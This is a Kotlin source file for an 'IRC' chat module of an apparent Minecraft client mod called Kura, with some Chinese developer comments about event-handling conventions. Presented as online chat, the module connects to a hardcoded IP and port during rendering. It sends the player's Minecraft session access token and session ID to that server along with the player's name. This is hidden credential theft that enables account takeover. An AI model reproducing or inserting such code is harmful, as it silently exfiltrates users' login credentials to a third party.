package dev.dyzjct.kura.module.modules.client

import base.events.render.Render3DEvent
import dev.dyzjct.kura.Kura
import dev.dyzjct.kura.module.Category
import dev.dyzjct.kura.module.Module
import helper.kura.socket.packet.GameInfoPacket

object IRC : Module(
    name = "IRC",
    langName = "在线聊天",
    category = Category.CLIENT,
    type = Type.Both
) {
    val mode by msetting("NoticeMode", Mode.Chat)

    private var lastName: String? = null
    override fun onEnable() {
        this.reset()
    }

    override fun onDisable() {
        this.reset()

        if (Kura.ircSocket.client.isConnected) {
            Kura.ircSocket.client.disconnect()
        }
    }

    init {
        onRender3D {
            val nameStr = player.name

            if (Kura.ircSocket.client.isConnected) {
                if (lastName == null || lastName != nameStr.toString()) {
                    Kura.ircSocket.client.send(
                        GameInfoPacket(
                            nameStr.toString(),
                            mc.session.accessToken,
                            mc.session.sessionId,
                            System.currentTimeMillis()
                        )
                    )
                    lastName = nameStr.toString()
                }
            } else {
                if (!Kura.ircSocket.client.isConnected) {
                    Kura.ircSocket.client.start("43.248.189.42", 45600)
                }
            }
        }
    }

    // 你沒有
    // 你去問問其他人吧     你需要什么？ 我需要你编写出正确的event写法
    // xianzheyangba
    /*
        TODO:要在init里面写
         safeEventListener<Event> { 不写这条默认为it -> 内容 }

        function名字前面@SafeClientEvent之后可以直接使用
            player.XXX
            world.xxx
            mc.xxx
            mc.interactionManager可以使用playerController代替

        TODO:正常的function不可以调用标有@SafeClientEvent的function 需要添加@SafeClientEvent
     */
    enum class Mode {
        Notification, Chat, Both
    }

    fun reset() {
        this.lastName = null
    }
}